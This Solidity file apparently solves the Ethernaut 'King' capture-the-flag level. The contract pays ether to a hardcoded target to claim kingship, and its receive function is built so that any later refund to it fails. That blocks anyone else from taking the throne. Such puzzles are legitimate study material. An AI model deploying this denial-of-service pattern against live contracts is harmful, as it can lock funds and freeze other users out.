// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

    address target = 0xDeC3152d1844F11a4812d62c5907d6e416707167;

    function coup() public payable {

        (bool success, ) = payable(target).call{value: msg.value}("");
        assert(success);
    }

    receive() external payable {
        payable(target).transfer(msg.value);
    }

}